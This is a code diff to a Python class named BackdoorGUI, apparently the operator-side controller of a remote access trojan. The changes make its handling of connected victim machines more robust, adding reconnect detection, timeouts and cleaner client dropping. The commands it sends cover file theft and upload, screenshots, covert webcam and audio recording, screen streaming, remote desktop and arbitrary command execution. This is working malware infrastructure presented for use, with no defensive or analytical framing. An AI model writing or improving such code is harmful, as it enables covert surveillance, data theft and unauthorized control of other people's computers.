@@ -311,6 +311,7 @@ class BackdoorGUI:
         self.active_client_id = None
         self.client_counter = 0
         self.clients_lock = threading.Lock()
+        self._known_ips = {}       # ip -> last cid, for reconnect detection
 
         self.ui_queue = queue.Queue()
         self.cmd_history = []
@@ -627,13 +628,28 @@ class BackdoorGUI:
                 continue
             except Exception:
                 break
+
+            # Recv timeout so hung threads don't block forever
+            try:
+                conn.settimeout(120)
+            except Exception:
+                pass
+
+            ip = addr[0]
+            is_reconnect = ip in self._known_ips
+
             with self.clients_lock:
                 self.client_counter += 1
                 cid = self.client_counter
                 self.clients[cid] = {"conn": conn, "addr": addr}
+            self._known_ips[ip] = cid
+
             label = f"#{cid}  {addr[0]}:{addr[1]}"
             self.ui_queue.put(("add_client", cid, label))
-            self.log(f"New connection #{cid}  {addr[0]}:{addr[1]}", "ok")
+            if is_reconnect:
+                self.log(f"↩ Client RECONNECTED #{cid}  {addr[0]}:{addr[1]}", "peach")
+            else:
+                self.log(f"New connection #{cid}  {addr[0]}:{addr[1]}", "ok")
 
     # ─── Client management ────────────────────────────────────────────────────
 
@@ -661,16 +677,27 @@ class BackdoorGUI:
         if cid is None:
             messagebox.showinfo("No Client", "Select a client first.")
             return
+        # Try a clean quit before dropping
+        with self.clients_lock:
+            info = self.clients.get(cid)
+        if info:
+            try:
+                self._send(info["conn"], "quit")
+            except Exception:
+                pass
+        self._drop_client(cid, "disconnected by operator")
+
+    def _drop_client(self, cid, reason="connection lost"):
+        """Close the socket, remove from client table, and update UI."""
         with self.clients_lock:
             info = self.clients.pop(cid, None)
         if info:
             try:
-                self._send(info["conn"], "quit")
                 info["conn"].close()
             except Exception:
                 pass
         self.ui_queue.put(("del_client", cid))
-        self.log(f"Client #{cid} disconnected.", "err")
+        self.log(f"▼ Client #{cid} dropped — {reason}", "err")
 
     # ─── Encrypted socket helpers ─────────────────────────────────────────────
 
@@ -698,10 +725,13 @@ class BackdoorGUI:
                     clear = _cipher.decrypt(parsed["e"].encode())
                     return json.loads(clear.decode())
                 return parsed
+            except socket.timeout:
+                self.log("Recv timeout (120 s) — client appears dead.", "err")
+                return None
             except ValueError:
                 continue
             except Exception as e:
-                self.log(f"Recv error: {e}", "err")
+                self.log(f"Recv error: {type(e).__name__}: {e}", "err")
                 return None
 
     def _recv_file(self, conn, save_path):
@@ -767,8 +797,13 @@ class BackdoorGUI:
     def _dispatch(self, conn, cid, cmd):
         try:
             self._run(conn, cid, cmd)
+        except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError,
+                OSError) as e:
+            self.log(f"Network error during '{cmd}': {e}", "err")
+            self._drop_client(cid, str(e))
         except Exception as e:
-            self.log(f"Error: {e}", "err")
+            self.log(f"Unexpected error during '{cmd}': {type(e).__name__}: {e}",
+                     "err")
 
     def _run(self, conn, cid, cmd):  # noqa: C901
         # ── download ─────────────────────────────────────────────────────────
@@ -776,9 +811,10 @@ class BackdoorGUI:
             file_name = cmd[9:].strip()
             self._send(conn, cmd)
             msg = self._recv(conn)
-            if msg:
-                self.log(str(msg), "info" if "[UPLOAD]" in str(msg) else "err")
-            if msg and "[UPLOAD]" in str(msg):
+            if msg is None:
+                self._drop_client(cid, "dropped during download"); return
+            self.log(str(msg), "info" if "[UPLOAD]" in str(msg) else "err")
+            if "[UPLOAD]" in str(msg):
                 self._recv_file(conn, file_name)
 
         # ── upload ────────────────────────────────────────────────────────────
@@ -789,21 +825,24 @@ class BackdoorGUI:
                 return
             self._send(conn, cmd)
             ready = self._recv(conn)
-            if ready:
-                self.log(str(ready), "info")
+            if ready is None:
+                self._drop_client(cid, "dropped before upload ready"); return
+            self.log(str(ready), "info")
             self._send_file(conn, file_path)
             result = self._recv(conn)
-            if result:
-                self.log(str(result),
-                         "ok" if "[DOWNLOAD]" in str(result) else "err")
+            if result is None:
+                self._drop_client(cid, "dropped after file send"); return
+            self.log(str(result),
+                     "ok" if "[DOWNLOAD]" in str(result) else "err")
 
         # ── screenshot ────────────────────────────────────────────────────────
         elif cmd == "screenshot":
             self._send(conn, cmd)
             status = self._recv(conn)
-            if status:
-                self.log(str(status), "ok" if "[+]" in str(status) else "err")
-            if status and "[+]" in str(status):
+            if status is None:
+                self._drop_client(cid, "dropped during screenshot"); return
+            self.log(str(status), "ok" if "[+]" in str(status) else "err")
+            if "[+]" in str(status):
                 up = self._recv(conn)
                 if up:
                     self.log(str(up), "info")
@@ -813,9 +852,10 @@ class BackdoorGUI:
         elif cmd == "webcam":
             self._send(conn, cmd)
             status = self._recv(conn)
-            if status:
-                self.log(str(status), "ok" if "[+]" in str(status) else "err")
-            if status and "[+]" in str(status):
+            if status is None:
+                self._drop_client(cid, "dropped during webcam"); return
+            self.log(str(status), "ok" if "[+]" in str(status) else "err")
+            if "[+]" in str(status):
                 up = self._recv(conn)
                 if up:
                     self.log(str(up), "info")
@@ -825,12 +865,14 @@ class BackdoorGUI:
         elif cmd.startswith("webcam_video"):
             self._send(conn, cmd)
             rec = self._recv(conn)
-            if rec:
-                self.log(str(rec), "info")
+            if rec is None:
+                self._drop_client(cid, "dropped during webcam_video"); return
+            self.log(str(rec), "info")
             done = self._recv(conn)
-            if done:
-                self.log(str(done), "ok" if "[+]" in str(done) else "err")
-            if done and "[+]" in str(done):
+            if done is None:
+                self._drop_client(cid, "dropped during webcam recording"); return
+            self.log(str(done), "ok" if "[+]" in str(done) else "err")
+            if "[+]" in str(done):
                 up = self._recv(conn)
                 if up:
                     self.log(str(up), "info")
@@ -840,12 +882,14 @@ class BackdoorGUI:
         elif cmd.startswith("audio_record"):
             self._send(conn, cmd)
             rec = self._recv(conn)
-            if rec:
-                self.log(str(rec), "info")
+            if rec is None:
+                self._drop_client(cid, "dropped during audio_record"); return
+            self.log(str(rec), "info")
             done = self._recv(conn)
-            if done:
-                self.log(str(done), "ok" if "[+]" in str(done) else "err")
-            if done and "[+]" in str(done):
+            if done is None:
+                self._drop_client(cid, "dropped during audio recording"); return
+            self.log(str(done), "ok" if "[+]" in str(done) else "err")
+            if "[+]" in str(done):
                 up = self._recv(conn)
                 if up:
                     self.log(str(up), "info")
@@ -862,13 +906,15 @@ class BackdoorGUI:
                     pass
             self._send(conn, cmd)
             init = self._recv(conn)
-            if init:
-                self.log(str(init), "info")
+            if init is None:
+                self._drop_client(cid, "dropped at stream start"); return
+            self.log(str(init), "info")
             for i in range(count):
                 fmsg = self._recv(conn)
-                if fmsg:
-                    self.log(str(fmsg), "teal")
-                if (fmsg and "[STREAM]" in str(fmsg)
+                if fmsg is None:
+                    self._drop_client(cid, f"dropped at stream frame {i+1}"); return
+                self.log(str(fmsg), "teal")
+                if ("[STREAM]" in str(fmsg)
                         and "failed" not in str(fmsg).lower()):
                     up = self._recv(conn)
                     if up:
@@ -881,21 +927,21 @@ class BackdoorGUI:
 
         # ── remote_desktop ────────────────────────────────────────────────────
         elif cmd == "remote_desktop":
-            self._send(conn, cmd)   # encrypted command
-            # Wait for 4-byte handshake marker "RDST" (raw, not encrypted)
+            self._send(conn, cmd)
             marker = b""
             while len(marker) < 4:
-                chunk = conn.recv(4 - len(marker))
+                try:
+                    chunk = conn.recv(4 - len(marker))
+                except Exception as e:
+                    self.log(f"Remote desktop: handshake error: {e}", "err")
+                    self._drop_client(cid, "RD handshake failed"); return
                 if not chunk:
-                    self.log("Remote desktop: connection lost during handshake",
-                             "err")
-                    return
+                    self._drop_client(cid, "RD handshake: connection closed"); return
                 marker += chunk
             if marker != b"RDST":
                 self.log(f"Remote desktop: bad handshake {marker!r}", "err")
-                return
+                self._drop_client(cid, "RD bad handshake"); return
             self.log("Remote desktop: stream starting…", "info")
-            # Ask main thread to open the viewer, then block until it closes
             done_event = threading.Event()
             self.ui_queue.put(("open_rdv", conn, cid, done_event))
             done_event.wait()
@@ -904,10 +950,7 @@ class BackdoorGUI:
         # ── quit ──────────────────────────────────────────────────────────────
         elif cmd == "quit":
             self._send(conn, cmd)
-            with self.clients_lock:
-                self.clients.pop(cid, None)
-            self.ui_queue.put(("del_client", cid))
-            self.log(f"Client #{cid} disconnected.", "err")
+            self._drop_client(cid, "session closed by operator")
 
         # ── generic (text-response) command ───────────────────────────────────
         else:
@@ -916,10 +959,7 @@ class BackdoorGUI:
             if response is not None:
                 self.log(str(response), "data")
             else:
-                self.log("Connection lost.", "err")
-                with self.clients_lock:
-                    self.clients.pop(cid, None)
-                self.ui_queue.put(("del_client", cid))
+                self._drop_client(cid, f"no response to '{cmd}'")
 
     # ─── History ──────────────────────────────────────────────────────────────
 
